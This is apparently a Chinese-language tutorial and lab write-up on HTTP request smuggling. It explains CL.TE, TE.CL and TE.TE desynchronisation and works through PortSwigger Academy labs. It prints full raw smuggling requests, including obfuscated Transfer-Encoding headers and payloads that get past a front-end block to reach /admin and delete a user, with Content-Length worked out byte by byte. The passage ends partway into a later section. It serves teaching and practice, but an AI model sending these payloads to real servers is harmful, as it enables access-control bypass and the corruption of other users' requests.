这时候正常用户的请求就拼接到了字母`a`的后面，当后端服务器接收完毕后，它实际处理的请求其实是
    aGET /index.html HTTP/1.1\r\n
    Host: example.com\r\n
这样的话用户就会收到一个类似于`aGET request method not
found`的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响。
但很明显这种情况过于“巧合”应该很难遇见，存在两个CL的包一般服务器都不会接受，在RFC2616的第4.4节中，规定:如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length，这就意味着我们可以在头部同时包含这两种请求头，相比这下这种方式更现实一些。
## CL.TE漏洞
front-end: `Contnt-Length` back-end: `Transfer-Encoding`
前端服务器使用了Content-Length标头，后端服务器使用Transfer-Encoding标头
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 13
    Transfer-Encoding: chunked
    0    （3字节）
          （2字节）
    SMUGGLED   （8字节，最后2个空字节不加）
前端服务器处理Contnt-Length，长度为13 涵盖了所有bady数据（空行算4个字节）  
后端服务器处理Transfer-Encoding，处理第一个块，该块被声明为零长度，因此被视为终止请求。余下的SMUGGLED，后端服务器将遗留字节作为下一个请求的开始
此时消息报文传输到采用Transfer-Encoding头的后端服务器，它是采用分块编码来处理消息报文的，当解析到第一个分块为0时，处理结束。那么剩余未处理的 smuggle-data
字节内容，后端服务器将一直等待直至下一个请求到来时处理，即后端服务器将这些字节视为序列中下一个请求的开始。此时若前端服务器继续向后端服务器发送请求或其他用户发送请求时，那么后端服务器接收的下一个请求内容就是：  
    SMUGGLEDPOST / HTTP/1.1
    Host: vulnerable-website.com
    ....
这样后端服务器将会返回响应：
    Unrecognized method SMUGGLEDPOST
进入靶场试试
请求正常：
加入TE头，并且构造POST数据，夹带出GPOST请求
发送恶意请求：
继续发送第二个请求（这个请求也可能是其他用户发送的，总之都在后端服务器的请求序列中），这个请求将加入后端服务器的请求等待序列并且被处理解析为GPOST请求方式：
然后就成了
## TE.CL漏洞
这里的前端服务器采用Transfer-Encoding头，而后端服务器采用Content-Length头。攻击者可以通过以下单个请求来进行夹带攻击：
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 4
    Transfer-Encoding: chunked
    12
    smuggle-data
    0
过程和上一lab相反，在单个请求中，前端服务器使用Transfer-Encoding头，将消息体视为分块编码方式，现不是依照CL头的长度来结束请求，而是通过TE头规范中遇到0字节来结束请求。故当前端服务器接收到第一个请求时候，解析得到的数据为：
    12
    smuggle-data
此数据包传输到采用Content-Length头的后端服务器，由于CL指定的长度为4，所以消息内容到12结束，剩余未处理的 smuggle-data
字节内容，后端服务器将一直等待直至下一个请求到来时处理。
在bp的Repeater时，要将"Repeater >> Update Content-Length"选项关闭，手工指定长度。
同样主页抓包，改为POST请求方式，并且加入Transfer-Encoding字段头：
造成请求夹带，这里手动将CL的长度改为4：
第二次发送请求即可夹带出GPOST请求：
## TE.TE漏洞
也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理`Transfer-Encoding`请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的`Transfer-Encoding`进行某种混淆操作，从而使其中一个服务器不处理`Transfer-Encoding`请求头。从某种意义上还是`CL-TE`或者`TE-CL`。
    1. Transfer-Encoding: xchunked
    2. Transfer-Encoding : chunked
    3. Transfer-Encoding: chunked
    4. Transfer-Encoding: x
    5. Transfer-Encoding:[tab]chunked
    6. [space]Transfer-Encoding: chunked
    7. X: X[\n]Transfer-Encoding: chunked
    8. Transfer-Encoding
    : chunked
要发现TE.TE漏洞，必须找到Transfer-Encoding头的某些变体，构造之，使得前端或后端服务器只有一个对其进行处理，而另一个服务器不进行TE解析，转而进行CL解析，演变成CL.TE或TE.CL漏洞的形式。
进入靶场试试
第一次请求
    POST / HTTP/1.1
    Host: 0a86003304b1bf71c01a33c2008100ad.web-security-academy.net
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Referer: https://portswigger.net/
    Connection: close
    Cookie: session=QB6Ea8U4A6t52sbFsxA8Oj4791fngORH
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: cross-site
    Pragma: no-cache
    Cache-Control: no-cache
    Content-Type: application/x-www-form-urlencoded
    Transfer-Encoding: chunked
    Transfer-encoding: x
    Content-Length: 4
    57
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
    0
首先在第17，18行对TE进行混淆，然后设置CL头的结束位置为四个字节，最后在0后面跟上两次换行，即`\r\n`
通过第一次请求，TE.TE转为TE.CL形式。
第二次请求，即完成HTTP请求夹带攻击：
ol
# 如何使用他来进行攻击
## 绕过前端安全控制
依然用的BP的练兵场，对于这种攻击方式BP提供了两个靶场，一个是CL.TE的，另一个是TE.CL形式的，这些稍后都会讲到。
### CL.TE形式
这个题题目要求是这样的
    本实验涉及前端和后端服务器，前端服务器不支持分块编码。
    /admin 有一个管理面板，但前端服务器阻止访问它。
    要解决实验室问题，请向访问管理面板并删除用户 carlos 的后端服务器发送请求。
架构和之前提到是CL-TE实验一样，只不过这次我们需要去利用 HTTP Smuggling 获取 admin 权限并删除 carlos 用户。
首先尝试访问`/admin`并观察请求，但被阻止了。
发现 `"Path /admin is blocked"`，看来不能通过正常方式访问`/admin`
构造个Smuggling方式访问试试
    POST / HTTP/1.1
    Host: 0aa400a60419aecec008449900fa009d.web-security-academy.net
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: keep-alive
    Cookie: session=clF0XU0E1rYd4rPv412CSigJ5kNxoZiI
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 30
    Transfer-Encoding: chunked
    0
    GET /admin HTTP/1.1
这里有个小细节，将`Connection`从`close`改为`Connection: keep-alive`
发送数据包两次，可以看到限制是什么
说是对本地用户开放，我们就加个host头，增加`Host: localhost`
一样POST了两次
可以看到有删除的接口，直接构造
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 70
    Transfer-Encoding: chunked
    0
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
然后就ol
这里CL数值计算是这样的
    -->POST data需要空一行，不计数
    0                                 -->3个字节
                                      -->2个字节
    GET /admin HTTP/1.1               -->19+2 = 21 个字节
                                      -->2个字节
                                      -->2个字节
    所以这么结算下来就是 3+2+21+2+2 = 30字节。
### TE.CL形式
题目要求和前面的是完全一样的，只不过是换了个形式
依旧是先尝试访问/admin，依旧是被阻塞
根据TE.CL来构造一个请求
    Content-length: 4
    Transfer-Encoding: chunked
                                                              -->POST data需要空一行，不计数
    60                                                        -->60占两个字符，换行两个字符，共四个，上面的CL限制字符数量为4，所以下面的内容当作下一个包的开头。
    POST /admin HTTP/1.1  
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15
    x=1
    0                                                         -->TE到0结束，从第五行到0为下个包
发包两次，然后成功访问
还是要求本地，加个host
    Content-length: 4
    Transfer-Encoding: chunked
    71
    POST /admin HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15
    x=1
    0
进入后，直接更改走私请求
    Content-length: 4
    Transfer-Encoding: chunked
    87
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15
    x=1
    0
就ok了
## 利用 HTTP 请求走私揭示前端请求重写
在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：
  * 描述TLS连接所使用的协议和密码
  * 包含用户IP地址的XFF头
  * 用户的会话令牌ID
总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：
  * 找一个能够将请求参数的值输出到响应中的POST请求